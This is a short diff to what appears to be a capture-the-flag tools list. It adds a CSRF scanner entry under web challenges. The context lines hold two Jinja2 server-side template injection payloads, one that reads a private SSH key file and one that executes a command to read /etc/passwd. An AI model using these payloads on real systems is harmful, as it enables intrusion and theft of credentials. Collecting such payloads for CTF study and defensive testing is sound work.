@@ -47,6 +47,7 @@ _Tools used for solving Web challenges_
 - - [Read File] {{ ''.__class__.__mro__[2].__subclasses__()[40]\()('/home/test/.ssh/id_rsa').read()}}
 - - [RCE] {{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
 - [Tplmap](https://github.com/epinna/tplmap) - Tplmap assists the exploitation of Code Injection and Server-Side Template Injection vulnerabilities
+- [CSRF] - pip3 install xsrfprobe - automated probe to check for CSRF on a target
 
 ### Crypto
 _Tools used for solving Crypto challenges_
